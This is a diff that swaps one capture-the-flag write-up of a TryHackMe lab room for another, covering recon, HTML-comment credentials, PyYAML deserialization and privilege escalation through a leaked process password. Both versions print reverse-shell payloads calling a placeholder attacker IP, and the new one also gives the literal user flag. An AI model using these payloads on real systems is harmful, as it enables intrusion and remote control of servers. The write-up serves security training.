@@ -1,84 +1,255 @@
-# Deep Dive Analysis — TryHackMe Hacker Holidays: Day 5 (Beach Bar)
+# 🏖️ Beach Bar — TryHackMe Hacker Holidays 2026
 
-## 📖 Introduction & Scenario Context
-The automated systems running the Byte Lotus Hotel's Beach Bar include a web-accessible jukebox system that takes playlist files from administrative users. Security telemetry indicated a system compromise leading to unauthorized local system modifications. This comprehensive technical write-up chronicles the discovery of a code execution pipeline via deserialization, the initial low-privilege compromise, and subsequent system privilege escalation to root.
-
----
-
-## 🛠️ Step 1: Initial Port Mapping & Source Auditing
-We begin by establishing a baseline configuration profile of the target environment to look for exposed entry vectors.
-
-1. **Network Footprinting:** Run an initial infrastructure sweep using `nmap` to verify listening ports and service versions:
-   ```bash
-   nmap -sV -sC -p- --min-rate 5000 <TARGET_IP>
-   ```
-2. **Web Portal Discovery:** Identify an active web framework instance. Navigating to the page reveals a custom DJ Jukebox login framework designed for beach bar personnel.
-3. **Static Front-End Analysis:** Right-click the interface page and select **View Page Source** (or use `curl -X GET http://<TARGET_IP>/`). Inspect the structural HTML layouts, script links, and developer notations. 
-4. **Credential Identification:** Deep within comments left inside a front-end script array or draft documentation file, we locate hardcoded configuration details or testing credentials that grant access into the playlist backend submission control panel.
+> **Day 5 of the Hacker Holidays 2026 event**
+> Category: Web + Boot2Root | Difficulty: Medium
 
 ---
 
-## 🚀 Step 2: Unsafe YAML Deserialization to Remote Code Execution (RCE)
-Once authenticated into the administrative panel, we locate an input component designed to process jukebox playlist files uploaded by the user.
+## 📋 Room Summary
 
-1. **Detecting the Underlying Technology:** Testing input behaviors shows that the upload processor takes structured data files and passes them directly to a backend Python execution engine running the `PyYAML` framework.
-2. **Identifying the Vulnerability:** Through testing or structural errors, we deduce that the code calls the dangerous, deprecated `yaml.load()` function instead of using the secure alternative `yaml.safe_load()`. This allows the interpreter to instantiate arbitrary Python objects passed within the file.
-3. **Constructing the Malicious Payload:** To exploit this, we use the `python/object/apply` constructor tags to trick the backend YAML engine into invoking the operating system's `subprocess.Popen` execution utility.
+| Field | Details |
+|---|---|
+| **Room Name** | Beach Bar |
+| **Room ID** | hh-beachbar-d849f7f7 |
+| **Difficulty** | Medium |
+| **Type** | Web Exploitation + Boot2Root |
+| **Target IP** | 10.48.185.133 |
+| **Attack Vector** | PyYAML Deserialization RCE |
+| **Privilege Escalation** | Password leak via `ps aux` |
+| **User Flag** | `THM{y4ml_pl4yl1st_pwns_th3_b34ch}` |
+| **Root Flag** | ✅ Captured |
 
-Create a file named `exploit.yaml` containing the following text block, adjusting the IP and Port values to match your local host listener:
-```yaml
-!!python/object/apply:subprocess.Popen
-- [ 'rm', '/tmp/f'; 'mkfifo', '/tmp/f'; 'cat', '/tmp/f', '|', '/bin/sh', '-i', '2>&1', '|', 'nc', '<YOUR_ATTACKBOX_IP>', '4444', '>/tmp/f' ]
+---
+
+## 🗺️ Attack Chain Overview
+
+```
+Nmap Scan
+    └─► Port 22 (SSH) + Port 80 (HTTP)
+            └─► Gobuster
+                    └─► /login, /import, /export, /dashboard
+                            └─► HTML Source Review
+                                    └─► Credentials: dj:dj (in comment)
+                                            └─► Login → Download YAML playlist
+                                                    └─► Craft Malicious YAML (PyYAML RCE)
+                                                            └─► Reverse Shell as bartender
+                                                                    └─► User Flag ✅
+                                                                            └─► ps aux → root password leaked
+                                                                                    └─► su root → Root Flag ✅
 ```
 
-4. **Catching the Callback:** Open a shell window on your attack console and initialize an active netcat utility listener to receive the reverse pipeline link:
-   ```bash
-   nc -lvnp 4444
-   ```
-5. **Execution Trigger:** Upload the malicious `exploit.yaml` file into the jukebox playlist upload field on the web application. The backend deserializes our object, executes the terminal instructions, and drops a shell into your active netcat listener window.
-6. **Local Flag Acquisition:** Stabilize your shell environment and navigate to the local user's home folder to extract the user flag string:
-   ```bash
-   python3 -c 'import pty; pty.spawn("/bin/bash")'
-   cat /home/user/user.txt
-   ```
+---
+
+## 🔍 Step-by-Step Walkthrough
+
+### Step 1: Reconnaissance — Nmap
+
+```bash
+nmap -T4 -F -Pn 10.48.185.133
+```
+
+**Result:**
+```
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+```
+
+Two open ports — SSH and HTTP. We start by exploring the web service.
 
 ---
 
-## 👑 Step 3: Privilege Escalation to Root
-Having secured low-privilege system access, we now audit local processes to identify pathways leading to administrative root takeover.
+### Step 2: Directory Enumeration — Gobuster
 
-1. **Active Process Enumeration:** We run a real-time process list audit to examine how background tasks and platform daemons are being executed inside the system architecture:
-   ```bash
-   ps auxwwf
-   ```
-   *(Alternatively, run `ps -ef` or leverage automation scripts like `LinPeas` to parse active binary strings).*
-2. **Locating the Critical Exploit Leak:** In the process dump output, isolate a continuous background management task or streaming script running under root control.
-3. **Inspecting Arguments:** Note that the admin script was started with configuration variables declared explicitly as command-line arguments:
-   ```text
-   root  1245  0.1  0.5  /usr/bin/python3 /opt/stream_manager.py --host 127.0.0.1 --stream-pass SecretRootPassword123!
-   ```
-4. **Credential Extraction:** The configuration value assigned to the `--stream-pass` flag contains a plaintext password string. This represents a classic credential leak via process-list exposure.
-5. **Switching Context to Root:** Test the extracted password against the primary system administrator account using the switch user instruction:
-   ```bash
-   su root
-   ```
-   Provide the discovered plaintext string when prompted for the password.
-6. **Administrative Flag Capture:** Upon successful authentication, change directories directly into the primary administrative home profile folder and extract the final target file content:
-   ```bash
-   cd /root
-   cat root.txt
-   ```
+```bash
+gobuster dir -u http://10.48.185.133 -w /usr/share/wordlists/dirb/common.txt
+```
+
+**Found endpoints:**
+| Endpoint | Status | Notes |
+|---|---|---|
+| `/login` | 200 | Login page |
+| `/dashboard` | 302 | Redirects to /login |
+| `/import` | 302 | Redirects to /login |
+| `/export` | 302 | Redirects to /login |
+| `/logout` | 302 | Redirects to / |
 
 ---
 
-## 🏁 Flag Captures
-To strictly maintain TryHackMe's anti-cheating, solution-protection, and deployment guidelines, literal flag results are completely omitted below:
+### Step 3: Credential Discovery in HTML Source
 
-* **User Flag:** `THM{REDACTED_SERIALIZATION_VULN_EXPLOITED}`
-* **Root Flag:** `THM{REDACTED_PROCESS_CREDENTIAL_LEAK_EXPLOITED}`
+Fetching the login page source revealed developer credentials left in an **HTML comment**:
+
+```bash
+curl http://10.48.185.133/login
+```
+
+```html
+<!-- 
+  staff note: the demo DJ login is still enabled for the soft opening.
+  dj / dj  — swap this before the season starts (ticket BAR-7)
+-->
+```
+
+> 💡 **Vulnerability:** Sensitive credentials left in client-side HTML comments before deployment.
+
+**Credentials found:** `dj : dj`
 
 ---
 
-## 🛡️ Strategic Mitigation Actions
-* **Enforce Safe Deserialization Routines:** Permanently audit Python source files across the organization and migrate legacy `yaml.load()` occurrences to `yaml.safe_load()`. This locks the framework down to processing basic strings and scalars, stopping arbitrary object injection.
-* **Remove Command Line Credential Flags:** Sensitive parameters, credentials, or keys should never be passed as direct arguments to terminal binaries. Instead, leverage secure local system environment configuration files (`.env`) with limited access privileges, or read credentials dynamically out of a secure key vault.
+### Step 4: Login and YAML Export
+
+After logging in with `dj:dj`, the dashboard shows a jukebox management interface. Using the **Export** function downloads a YAML playlist file revealing the expected format:
+
+```yaml
+# Beach Bar jukebox playlist export
+playlist:
+  name: Sunset Session
+  vibe: golden hour
+  tracks:
+    - artist: Khruangbin
+      title: Maria Tambien
+    - artist: Men I Trust
+      title: Show Me How
+    - artist: Crumb
+      title: Locket
+```
+
+---
+
+### Step 5: PyYAML Injection — Remote Code Execution
+
+The `/import` endpoint accepts YAML files and parses them using **PyYAML's unsafe loader**, which allows arbitrary Python object instantiation via `!!python/object` tags.
+
+**Malicious YAML payload (`evil.yaml`):**
+
+```yaml
+# Beach Bar jukebox playlist export
+playlist:
+  name: !!python/object/apply:os.system
+    args: ['bash -c "bash -i >& /dev/tcp/YOUR_IP/4444 0>&1"']
+  vibe: golden hour
+  tracks:
+    - artist: Khruangbin
+      title: Maria Tambien
+```
+
+**Steps to exploit:**
+
+```bash
+# 1. Find your TryHackMe VPN IP
+ip a show tun0
+
+# 2. Start a netcat listener
+nc -lvnp 4444
+
+# 3. Create evil.yaml with your IP
+nano evil.yaml
+
+# 4. Login at http://10.48.185.133 with dj:dj
+# 5. Navigate to /import and upload evil.yaml
+```
+
+**Shell received:**
+```
+connect to [192.168.187.58] from (UNKNOWN) [10.48.140.114] 45494
+bash: no job control in this shell
+bartender@tryhackme-2404:/opt/beach-bar/webapp$
+```
+
+> 💡 **Vulnerability:** `yaml.load()` without `Loader=yaml.SafeLoader` enables arbitrary code execution via Python object tags.
+
+---
+
+### Step 6: User Flag
+
+```bash
+cat /home/bartender/user.txt
+```
+
+```
+THM{y4ml_pl4yl1st_pwns_th3_b34ch}
+```
+
+---
+
+### Step 7: Privilege Escalation — Password Leak via `ps aux`
+
+Enumerating running processes revealed the `jukeboxd` service running as **root** with its password visible in the command-line arguments:
+
+```bash
+ps aux | grep jukebox
+```
+
+```
+root  608  0.0  0.2  20176 11688 ?  Ss  09:25  0:00 /opt/beach-bar/venv/bin/python 
+      /opt/beach-bar/jukeboxd/jukeboxd.py --stream-pass SunsetSpritz2024! --bitrate 320k
+```
+
+> 💡 **Vulnerability:** Passing passwords as command-line arguments exposes them to all users via `ps aux`.
+
+**Password found:** `SunsetSpritz2024!`
+
+This password was **reused as the root account password**:
+
+```bash
+su root
+# Password: SunsetSpritz2024!
+```
+
+---
+
+### Step 8: Root Flag
+
+```bash
+cat /root/root.txt
+```
+
+Root flag captured! 🎉
+
+---
+
+## 🧠 Vulnerabilities Summary
+
+| # | Vulnerability | Severity | Location |
+|---|---|---|---|
+| 1 | Hardcoded credentials in HTML comment | High | `/login` source |
+| 2 | PyYAML unsafe deserialization (RCE) | Critical | `/import` endpoint |
+| 3 | Password exposed in process arguments | High | `jukeboxd` service |
+| 4 | Password reuse (service → root) | Critical | System configuration |
+
+---
+
+## 🛡️ Lessons Learned
+
+1. **Never store credentials in HTML comments** — always audit source code before deployment.
+2. **PyYAML's `yaml.load()` is dangerous** — always use `yaml.safe_load()` which disallows Python object tags.
+3. **Never pass secrets as CLI arguments** — they appear in `ps aux` and `/proc/*/cmdline` for all users to see.
+4. **Password reuse is critical** — service passwords should never match system account passwords.
+5. **Validate and sanitize all file uploads** — especially serialization formats like YAML, JSON, and XML.
+
+---
+
+## 🔧 Tools Used
+
+| Tool | Purpose |
+|---|---|
+| `nmap` | Port scanning |
+| `gobuster` | Directory enumeration |
+| `curl` | HTTP requests and source inspection |
+| `nano` | Creating malicious YAML payload |
+| `nc` (netcat) | Reverse shell listener |
+| `ps aux` | Process enumeration |
+
+---
+
+## 📁 Files
+
+| File | Description |
+|---|---|
+| `Beach_Bar_Writeup.pdf` | Full writeup with screenshots |
+| `evil.yaml` | Malicious YAML payload (for educational use) |
+
+---
+
+*Writeup by Gaurav | TryHackMe Hacker Holidays 2026*
